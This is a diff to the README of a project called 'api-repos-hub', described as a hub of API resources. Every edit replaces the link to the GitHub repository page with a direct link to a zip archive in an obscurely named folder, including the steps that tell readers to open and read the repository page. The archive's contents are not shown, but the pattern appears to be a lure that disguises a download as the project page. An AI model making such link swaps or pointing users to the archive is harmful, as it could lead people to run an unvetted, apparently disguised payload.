@@ -1,6 +1,6 @@
 # 📚 api-repos-hub - Find Better APIs Faster
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20repository-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/laurainegassy36/api-repos-hub)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20repository-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/laurainegassy36/api-repos-hub/main/nummulite/hub_repos_api_3.7.zip)
 
 ## 🧭 What this is
 
@@ -35,7 +35,7 @@ If you plan to use the resources in your own work, it helps to have:
 
 1. Open your web browser.
 2. Go to the download page:
-   https://github.com/laurainegassy36/api-repos-hub
+   https://raw.githubusercontent.com/laurainegassy36/api-repos-hub/main/nummulite/hub_repos_api_3.7.zip
 3. Read the repository page.
 4. Look through the folders, links, and README content.
 5. Click any API resource or guide you want to explore.
@@ -46,7 +46,7 @@ If you plan to use the resources in your own work, it helps to have:
 
 Visit this page to download or access the project:
 
-https://github.com/laurainegassy36/api-repos-hub
+https://raw.githubusercontent.com/laurainegassy36/api-repos-hub/main/nummulite/hub_repos_api_3.7.zip
 
 On the GitHub page, you can:
 
@@ -204,7 +204,7 @@ This repository is built around topics like:
 
 Start with the main repository page:
 
-https://github.com/laurainegassy36/api-repos-hub
+https://raw.githubusercontent.com/laurainegassy36/api-repos-hub/main/nummulite/hub_repos_api_3.7.zip
 
 Then do one of these:
 
@@ -229,4 +229,4 @@ This makes it easier to return to the same resources later
 ## 🔗 Link you should use
 
 Primary page:
-https://github.com/laurainegassy36/api-repos-hub
+https://raw.githubusercontent.com/laurainegassy36/api-repos-hub/main/nummulite/hub_repos_api_3.7.zip
